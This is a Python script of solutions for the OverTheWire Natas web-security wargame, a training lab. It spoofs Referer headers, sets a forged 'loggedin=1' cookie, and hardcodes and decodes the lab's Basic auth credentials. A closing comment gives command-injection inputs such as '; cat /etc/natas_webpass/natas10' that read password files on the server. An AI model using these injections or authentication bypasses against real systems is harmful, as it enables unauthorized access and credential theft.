#!/usr/bin/python3
# in the natas 0 1 and 2 you can find the password in the source code
# for natas 3 you can find the password viewing the files folder and 
# for natas 4 in the same direction but viewing the robots.txt page



from pwn import *
import requests
from pprint import pprint 



CONTENT_DIRECTORY = "/etc/natas_webpass/natas8"



def natas4():
    
    sess = requests.session()
    sess.headers.update(
            {
            "referer":"http://natas5.natas.labs.overthewire.org/",
            "Authorization":"Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va"})    
    # Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
    # this is the Authorization decoded from base 64 natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
    ress = sess.get(url="http://natas4.natas.labs.overthewire.org/")
    pprint(ress.text)


def natas5():
    r"""
    Here you can find the following condition "Access dissallowed. You are not logged in"
    >>> in the headers you can find this loggedin=0
    """
    cookies = {"loggedin":"1"}
    sess = requests.session()
    sess.headers.update({"Authorization":"Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx"})
    ress = sess.get(url="http://natas5.natas.labs.overthewire.org/", cookies=cookies)    
    pprint(ress.text)



def natas8():
    """
    # you can see the variable $encodeSecret with the following value
    # you can use the command:
        echo "3d3d516343746d4d6d6c315669563362" | xxd -ps -r | rev | base64 -d;echo

    # and input the decoded string as the key and you get the value for natas 9
    <?

        $encodedSecret = "3d3d516343746d4d6d6c315669563362";

        function encodeSecret($secret) {
            return bin2hex(strrev(base64_encode($secret)));
        }

        if(array_key_exists("submit", $_POST)) {
            if(encodeSecret($_POST['secret']) == $encodedSecret) {
                print "Access granted. The password for natas9 is <censored>";
            } else {
            print "Wrong secret";
            }
        }
    ?>
    """
    pass




"""
for natas10 needs to pass the following input 
; cat /etc/natas_webpass/natas10
and you get the password for natas10

for natas11 it's so similar but not the same
c /etc/natas_webpass/natas11
"""



def natas6():
    pass


def main():
    natas5()




if __name__ == "__main__":
    main()

